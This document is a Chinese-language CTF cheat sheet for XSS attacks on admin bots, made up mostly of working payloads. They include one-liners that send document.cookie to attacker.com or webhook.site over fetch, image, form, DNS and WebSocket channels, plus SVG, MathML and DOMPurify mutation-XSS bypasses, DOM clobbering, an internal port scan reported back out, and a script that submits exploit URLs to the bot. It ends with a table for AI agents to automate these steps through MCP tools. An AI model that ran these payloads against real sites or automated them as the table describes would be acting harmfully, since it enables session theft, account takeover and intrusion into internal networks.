# Admin Bot / XSS 实战

## 核心模型

CTF admin bot 本质：**一个 headless 浏览器，带着高权限 cookie/localStorage 访问你提供的 URL**。目标不是 `alert(1)`，而是通过允许的渠道把 flag/sensitive data 外带出来。

## 外带通道

```javascript
// 按 CSP 适配选择外带方式:
// 优先级: fetch > image > form > window.location > DNS

// 通道 1: fetch (需 connect-src 允许目标域或 *)
fetch('https://attacker.com/s?' + document.cookie)
fetch('https://webhook.site/YOUR-UUID?s=' + btoa(document.cookie))

// 通道 2: Image beacon (img-src 允许)
new Image().src = 'https://attacker.com/x?' + document.cookie

// 通道 3: Form submit (form-action 允许)
var f = document.createElement('form'); f.method='POST';
f.action = 'https://attacker.com/collect';
var i = document.createElement('input'); i.name='d'; i.value=document.cookie;
f.appendChild(i); document.body.appendChild(f); f.submit();

// 通道 4: window.location (无限制 — 但会跳走)
window.location = 'https://attacker.com/' + document.cookie

// 通道 5: DNS (最可靠, 绕过几乎所有 CSP)
new Image().src = 'https://' + btoa(document.cookie).slice(0,60) + '.attacker.com/x'

// 通道 6: WebSocket (connect-src ws:)
var ws = new WebSocket('wss://attacker.com/leak');
ws.onopen = function() { ws.send(document.cookie); };
```

## CSP 绕过速查

```javascript
// 给定 CSP 头，选择对应的绕过 payload:

// script-src 'none' / no 'unsafe-inline'
// → 需要 script gadget 或 DOM clobbering
// (无通用绕过，需针对目标库找 gadget)

// script-src 'self' 'unsafe-inline'
// → 直接注入 <script>alert(1)</script>

// object-src 'none'
// → 不能用 <object>/<embed>/<applet>

// img-src * → Image beacon 外带
// connect-src * → fetch/WS 外带
// form-action * → form submit 外带

// default-src 'none' + specific allows
// → DNS exfil via <img> or <link> 一般是最后手段
```

## DOM Clobbering

```javascript
// 当 script 不可控但 HTML 注入存在时：
// 通过 HTML 注入创建假元素，影响 JS 中全局变量的值

// 目标 JS: if (window.config.debug) { ... }
// 注入:
// <a id="config" name="debug" href="x">

// 目标 JS: if (document.getElementById('isAdmin').value === 'true')
// 注入:
// <input id="isAdmin" value="true">

// 通用探测:
var clobbered = ['config', 'debug', 'isAdmin', 'isPremium', 'role', 'perm']
for (var k of clobbered) {
    if (typeof window[k] !== 'undefined') { /* 可 clobber */ }
}
```

## SVG/MathML 逃逸沙箱

```xml
<!-- 如果 HTML 标签被过滤，尝试 SVG namespace -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>/* 可能绕过仅匹配 HTML namespace 的过滤器 */</script>
  <animate onbegin="fetch('https://attacker.com/'+document.cookie)" attributeName="x" dur="1s"/>
  <set onbegin="fetch('https://attacker.com/'+document.cookie)" attributeName="x" to="1"/>
</svg>

<!-- MathML 类似 -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('https://attacker.com/'+document.cookie)>-->
```

## Sanitizer 绕过

```javascript
// DOMPurify 绕过探测 (version specific)
// payload 模板库:

// Mutation XSS (innerHTML → namespace confusion)
"<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"

// 嵌套 template 绕过
"<template><slot name=x><img src=x onerror=alert(1)></slot></template>"

// 利用原型链
"<a id=x><table><a id=x>"

// 利用 CDATA 边界
"<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>"

// 如果 sanitizer 版本可识别 → 查已知 CVE
```

## Admin Bot 交互脚本

```python
# bot_interact.py — 与 admin bot 交互的请求模板
import requests

BOT_SUBMIT_URL = "https://target.com/report"  # 提交 URL 让 bot 访问

def send_to_bot(url: str) -> dict:
    """提交 URL 给 admin bot 访问"""
    # 典型格式 1: form POST
    r = requests.post(BOT_SUBMIT_URL, data={"url": url})
    # 典型格式 2: JSON
    # r = requests.post(BOT_SUBMIT_URL, json={"url": url})
    # 典型格式 3: GraphQL
    # r = requests.post(BOT_SUBMIT_URL, json={
    #     "query": 'mutation { visitUrl(url: "' + url + '") { success } }'
    # })
    return {"status": r.status_code, "body": r.text}

def build_exploit_url(payload_js: str, callback_url: str) -> str:
    """构造包含 XSS payload 的 URL"""
    # 方式 1: 反射型 XSS
    return f"https://target.com/search?q=<img src=x onerror='{payload_js}'>"

    # 方式 2: 存储型 XSS (payload 已存在页面上)
    # return f"https://target.com/profile/attacker"

    # 方式 3: 直接可控页面
    # return f"https://attacker.com/exploit.html"
```

## 通过 admin bot 打内网

```javascript
// admin bot 可能运行在内网环境
// XSS payload 扫描内网:
async function scan_internal() {
    let results = [];
    for (let port of [80, 443, 8080, 8443, 3000, 5000, 6379, 9200]) {
        try {
            let r = await fetch(`http://127.0.0.1:${port}/`, {mode:'no-cors'});
            results.push(`port ${port}: open`);
        } catch(e) {}
    }
    fetch('https://attacker.com/r?' + JSON.stringify(results));
}
```

## 攻击链

```
XSS → cookie 窃取 → Session hijack → Account Takeover
XSS → CSRF token 读取 → 完整 CSRF → 改密码/转账
XSS → localStorage → JWT/Access Token 窃取 → API 滥用
XSS → admin bot → 内网扫描 → SSRF → 内网 RCE
XSS → DOM Clobbering → 修改 config.isAdmin → 前端鉴权绕过
XSS → CSP bypass via image → 外带 flag
XSS → SVG → CSP script-src bypass (某些浏览器) → 任意 JS 执行
XSS → Sanitizer bypass → Mutation XSS → 持久化存储 → 所有用户感染
XSS → WebSocket → 注入消息 → 服务端命令执行
XSS → Service Worker → 持久化中间人 → 全站劫持

## Browser Parser Differentials (2024+)

### Streamed vs Non-Streamed HTML

```html
<!-- Chrome 流式解析 vs data: URI 一次性解析 → 不同的 DOM 树 -->
<!-- ISO-2022-JP charset 切换使 CSP meta 标签只在一种模式下可见 -->

<meta http-equiv="Content-Type" content="text/html; charset=iso-2022-jp">
<script>
  // 流式模式下: 浏览器已解析并应用了 CSP meta
  // data: 模式下: CSP meta 还未出现 → 可执行 inline script
</script>
```

### qs vs URLSearchParams Parser Differential

```javascript
// Node.js qs: ]= 是键值分隔符 (优先级高于 =)
// 浏览器 URLSearchParams: ]= 只是普通字符
// → URL: ?a]=x&a=y 在服务器上 → a=["x","y"]，浏览器认为是 a]="x", a="y"

// XSS via parser differential:
// Server sees: redirect_uri=https://safe.com
// Browser sees redirect_uri]=https: → safe.com 变成 key
```

## Sanitizer 绕过 (DOMPurify 2024+)

```html
<!-- Mutation XSS — 过滤后 DOM 和渲染后 DOM 不同 -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>location='//attacker.com/'+btoa(t))>-->

<!-- Namespace confusion — SVG 内的 HTML 被不同解析 -->
<svg><foreignObject><div id="x"></div></foreignObject></svg>
```

### 自动化 Sanitizer Fuzz

```python
# Dom-Explorer — 系统化发现 parser 差异
# npm install dom-explorer
# 比较: sanitizer 输出的 DOM vs 浏览器渲染的 DOM
# 找到两者不一致 → 潜在 mutation XSS
```
```

## 证据

记录: 注入点、完整 payload、CSP 头、sanitizer 版本、bot 类型(headless chrome/puppeteer/playwright)、外带通道、接收到的数据。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| XSS 入口探测 | `http_probe` | HTTP GET 探测 XSS 注入点 |
| 知识检索 | `kb_router` | 按 XSS 攻击信号搜索知识库 |
